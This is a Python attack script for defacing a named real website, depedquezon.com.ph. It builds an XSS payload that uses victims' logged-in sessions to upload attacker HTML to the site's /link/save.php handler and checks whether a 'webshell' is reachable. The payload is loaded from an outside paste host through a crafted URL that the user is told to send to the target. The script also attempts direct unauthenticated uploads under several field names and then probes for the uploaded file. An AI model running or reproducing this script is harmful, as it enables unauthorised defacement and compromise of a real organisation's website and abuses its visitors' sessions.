#!/usr/bin/env python3
"""
depedxss.py - Upload .html deface via XSS on depedquezon.com.ph

Usage:
  python3 depedxss.py --html anon.html
"""

import argparse, base64, sys, urllib.parse
from pathlib import Path

try:
    import requests
except ImportError:
    print("[!] pip install requests")
    sys.exit(1)

requests.packages.urllib3.disable_warnings()

BASE = "https://depedquezon.com.ph"

def main():
    parser = argparse.ArgumentParser(description="Upload HTML via XSS on depedquezon.com.ph")
    parser.add_argument("--html", "-f", required=True, help="Your .html deface file")
    parser.add_argument("--output", "-o", default="xss_payload.js", help="Output JS payload file")
    args = parser.parse_args()

    html_path = Path(args.html)
    if not html_path.exists():
        print(f"[!] File not found: {args.html}")
        sys.exit(1)

    html_content = html_path.read_text(encoding="utf-8", errors="replace")
    filename = html_path.name

    # Base64 encode the HTML for the JS payload
    html_b64 = base64.b64encode(html_content.encode()).decode()

    # JS payload - uploads file to /link/save.php using same-origin fetch
    js_payload = f"""(function(){{
var b=new Blob([atob('{html_b64}')],{{type:'text/html'}});
var d=new DataTransfer();
d.items.add(new File([b],'{filename}',{{type:'text/html'}}));
var fd=new FormData();
fd.append('file',d.files[0],'{filename}');
fetch('/link/save.php',{{method:'POST',body:fd,mode:'same-origin',credentials:'include'}})
.then(function(r){{
if(r.status==200){{console.log('[OK] Uploaded {filename}')}}
fetch('/link/save.php?d='+btoa('/')).then(function(r2){{return r2.text()}}).then(function(html){{console.log('[OK] Webshell reachable')}});
}})
.catch(function(e){{console.log('[FAIL]',e)}});
}})();"""

    # Save the JS payload
    Path(args.output).write_text(js_payload)
    print(f"[✓] JS payload saved to: {args.output} ({len(js_payload)} bytes)")

    # The XSS trigger URL
    xss_url = f"{BASE}/?result=<script+src%3D"https%3A%2F%2Fjso.defacer.id%2Fraw%2Fx4s39ct9Id"><%2Fscript>"

    print(f"\n{'='*60}")
    print("  STEP 1: PASTE THIS ON jso.defacer.id/raw/nc91wdsbZ7")
    print(f"{'='*60}\n")
    print(js_payload)
    print()
    print(f"{'='*60}")
    print("  STEP 2: SEND THIS XSS URL TO THE TARGET")
    print(f"{'='*60}\n")
    print(f"  {xss_url}")
    print()

    # Also try direct upload as a bonus
    print(f"{'='*60}")
    print("  ALSO TRYING DIRECT UPLOAD...")
    print(f"{'='*60}")
    
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    
    # Try multiple field names on the upload handler
    for field in ["file", "uploaded_file", "userfile", "fileToUpload", "upload"]:
        try:
            r = s.post(f"{BASE}/link/save.php",
                       files={field: (filename, html_content.encode(), "text/html")},
                       timeout=15, verify=False)
            print(f"  POST /link/save.php (field='{field}') -> {r.status_code}")
        except Exception as e:
            print(f"  POST /link/save.php (field='{field}') -> ERROR: {e}")

    # Check if file appeared anywhere
    print(f"\n{'='*60}")
    print("  CHECKING FOR UPLOADED FILE...")
    print(f"{'='*60}")
    for path in [f"/data_files/{filename}", f"/link/{filename}",
                  f"/img/{filename}", f"/{filename}",
                  f"/data_files/news/{filename}"]:
        try:
            r = s.get(f"{BASE}{path}", timeout=10, verify=False)
            if r.status_code == 200 and len(r.text) > 100:
                print(f"  [✓] FOUND: {BASE}{path} ({len(r.text)} bytes)")
            else:
                print(f"  [ ] {r.status_code} {BASE}{path}")
        except:
            print(f"  [ ] ERR {BASE}{path}")

if __name__ == "__main__":
    main()
